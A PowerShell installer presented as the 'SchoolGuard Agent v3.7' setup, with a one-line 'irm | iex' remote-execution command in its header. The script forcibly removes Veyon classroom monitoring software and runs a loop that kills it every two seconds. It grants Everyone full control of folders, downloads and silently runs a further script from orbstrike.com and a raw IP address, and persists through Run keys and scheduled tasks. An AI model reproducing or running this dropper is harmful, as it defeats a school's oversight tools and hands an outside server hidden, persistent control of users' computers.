# ============================================================================
# SchoolGuard Agent v3.7 — Headless One-Command Master Setup (Windows)
# Master Command:
#   powershell -NoProfile -ep Bypass -c "irm https://orbstrike.com/win | iex"
#   powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install_win.ps1'))"
# ============================================================================
param(
    [string]$ServerUrl = "https://103-149-172-179.sslip.io"
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls

function Show-TuiProgress {
    param([int]$Percent, [string]$Status)
    $width = 28
    $filled = [math]::Floor(($Percent * $width) / 100)
    $empty = $width - $filled
    $bar = ("#" * $filled) + ("-" * $empty)
    $pad = $Status.PadRight(44).Substring(0, 44)
    Write-Host -NoNewline "`r  [$bar] $($Percent.ToString().PadLeft(3))%  $pad" -ForegroundColor Cyan
}

Show-TuiProgress -Percent 5 -Status "Initializing headless environment..."

$InstallDir = Join-Path $env:LOCALAPPDATA "SchoolGuard"
if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# ----------------------------------------------------------------------------
# 1. Eradicate Legacy Monitoring Agents (Veyon) & Rescue Input
# ----------------------------------------------------------------------------
Show-TuiProgress -Percent 20 -Status "Removing legacy monitoring agents..."

try {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class SGInputRescue {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@ -ErrorAction SilentlyContinue
    [SGInputRescue]::BlockInput($false) | Out-Null
} catch {}

Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Force -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Force -ErrorAction SilentlyContinue

Stop-Service -Name "VeyonService" -Force -ErrorAction SilentlyContinue
Set-Service -Name "VeyonService" -StartupType Disabled -ErrorAction SilentlyContinue
& sc.exe stop VeyonService 2>&1 | Out-Null
& sc.exe config VeyonService start= disabled 2>&1 | Out-Null
& sc.exe delete VeyonService 2>&1 | Out-Null

$veyonProcs = @("veyon-service", "veyon-worker", "veyon-server", "veyon-master", "veyon-configurator", "veyon-cli", "veyon*")
foreach ($p in $veyonProcs) {
    Get-Process -Name $p -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    & taskkill.exe /F /IM "$p.exe" /T 2>&1 | Out-Null
}

$veyonDirs = @(
    "$env:ProgramFiles\Veyon",
    "${env:ProgramFiles(x86)}\Veyon",
    "$env:ProgramData\Veyon",
    "$env:APPDATA\Veyon",
    "$env:LOCALAPPDATA\Veyon"
)
foreach ($d in $veyonDirs) {
    if (Test-Path "$d\uninstall.exe") {
        Start-Process -FilePath "$d\uninstall.exe" -ArgumentList "/S" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
    }
    if (Test-Path $d) {
        & takeown.exe /F "$d" /R /D Y 2>&1 | Out-Null
        & icacls.exe "$d" /grant "*S-1-1-0:(OI)(CI)F" /T /C /Q 2>&1 | Out-Null
        Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
    }
}

$shortcutDirs = @(
    "$env:Public\Desktop",
    "$env:USERPROFILE\Desktop",
    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Veyon",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Veyon"
)
foreach ($sd in $shortcutDirs) {
    if (Test-Path $sd) {
        Get-ChildItem -Path $sd -Filter "*Veyon*" -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
    }
}

Remove-Item -Path "HKLM:\SOFTWARE\Veyon Solutions" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Veyon Solutions" -Recurse -Force -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Veyon*" -Force -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Veyon*" -Force -ErrorAction SilentlyContinue

# Continuous user-level Veyon blocker script
$BlockerPath = Join-Path $InstallDir "veyon_blocker.ps1"
@"
`$ErrorActionPreference = 'SilentlyContinue'
while (`$true) {
    Get-Process -Name 'veyon*' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}
"@ | Set-Content -Path $BlockerPath -Encoding UTF8 -Force

# ----------------------------------------------------------------------------
# 2. Network Configuration & System Provisioning
# ----------------------------------------------------------------------------
Show-TuiProgress -Percent 45 -Status "Configuring network & environment..."

$VpsPrimary = "https://orbstrike.com"
$VpsFallback = "https://103-149-172-179.sslip.io"
$VpsHttp = "http://103.149.172.179:4000"

# ----------------------------------------------------------------------------
# 3. Provision SchoolGuard Agent
# ----------------------------------------------------------------------------
Show-TuiProgress -Percent 70 -Status "Provisioning SchoolGuard agent..."

$AgentDest = Join-Path $InstallDir "agent_win.ps1"
$LocalAgent = if ($PSScriptRoot) { Join-Path $PSScriptRoot "agent_win.ps1" } else { "" }

$downloaded = $false
if ($LocalAgent -and (Test-Path $LocalAgent)) {
    Copy-Item -Path $LocalAgent -Destination $AgentDest -Force
    $downloaded = $true
} else {
    foreach ($base in @($VpsPrimary, $ServerUrl, $VpsFallback, $VpsHttp)) {
        if ($downloaded) { break }
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Encoding = [System.Text.Encoding]::UTF8
            $content = $wc.DownloadString("$base/agent/agent_win.ps1")
            if ($content -and $content.Length -gt 500) {
                [System.IO.File]::WriteAllText($AgentDest, $content, (New-Object System.Text.UTF8Encoding($false)))
                $downloaded = $true
            }
        } catch {}
    }
}

# ----------------------------------------------------------------------------
# 4. Configure Headless Background Persistence & Launch
# ----------------------------------------------------------------------------
Show-TuiProgress -Percent 90 -Status "Activating headless background service..."

$VbsLauncher = Join-Path $InstallDir "run_hidden.vbs"
$VbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$AgentDest"" -ServerUrl ""$ServerUrl""", 0, False
WshShell.Run "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$BlockerPath""", 0, False
"@
Set-Content -Path $VbsLauncher -Value $VbsContent -Encoding ASCII -Force

$RunKeyCU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RunKeyCU -Name "SchoolGuardAgent" -Value "wscript.exe //B //NoLogo `"$VbsLauncher`"" -Force -ErrorAction SilentlyContinue

$RunKeyLM = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RunKeyLM -Name "SchoolGuardAgent" -Value "wscript.exe //B //NoLogo `"$VbsLauncher`"" -Force -ErrorAction SilentlyContinue

& schtasks.exe /Create /TN "SchoolGuardAgent" /TR "wscript.exe //B //NoLogo `"$VbsLauncher`"" /SC ONLOGON /RL HIGHEST /F 2>&1 | Out-Null
& schtasks.exe /Create /TN "SchoolGuardAgentUser" /TR "wscript.exe //B //NoLogo `"$VbsLauncher`"" /SC MINUTE /MO 2 /F 2>&1 | Out-Null

Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue | Where-Object {
    $_.CommandLine -like "*agent_win.ps1*" -and $_.ProcessId -ne $PID
} | ForEach-Object {
    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
}

Start-Process -FilePath "wscript.exe" -ArgumentList "//B //NoLogo `"$VbsLauncher`"" -WindowStyle Hidden -ErrorAction SilentlyContinue

Show-TuiProgress -Percent 100 -Status "Complete"
Write-Host ""
Write-Host "  [OK] SchoolGuard Agent v3.7 active (headless mode)." -ForegroundColor Green
